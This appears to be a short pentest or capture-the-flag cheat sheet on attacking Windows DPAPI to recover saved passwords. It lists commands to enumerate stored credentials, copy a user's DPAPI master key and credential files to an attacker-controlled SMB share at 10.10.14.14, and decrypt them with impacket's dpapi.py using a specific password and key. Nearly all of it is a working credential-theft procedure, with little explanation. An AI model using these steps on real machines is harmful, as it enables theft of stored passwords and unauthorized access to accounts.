# DpApi attack  
DPAPI is Windows' built-in encryption system that protects things like saved passwords and Wi-Fi keys. Attackers don't break the encryption - they steal the keys to decrypt it.

# Verify it 
```language
cmdkey /list
```
# Get the sid
```language
whoami /all
or
impacket-getpac.py
```
# Grab these two files
```language
C:\Users\<user>\AppData\Roaming\Microsoft\Protect

C:\Users\<user>\AppData\Roaming\Microsoft\Credentials
```
# For Example:-
```language
#start a smb server to downk=load the files
sudo impacket-smbserver share ./ -smb2support

#connec the box
net use \\ip\share

#copy the files
copy C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580 \\10.10.14.14\share
copy C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290 \\10.10.14.14\share

# Extract the Master key
python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file 0792c32e-48a5-4fe3-8b43-d93d64590580 -password '4Cc3ssC0ntr0ller' -sid  S-1-5-21-953262931-566350628-63446256-1001

# Extract the password
python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential -file 51AB168BE4BDB3A603DADE4F8CA81290 -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
```
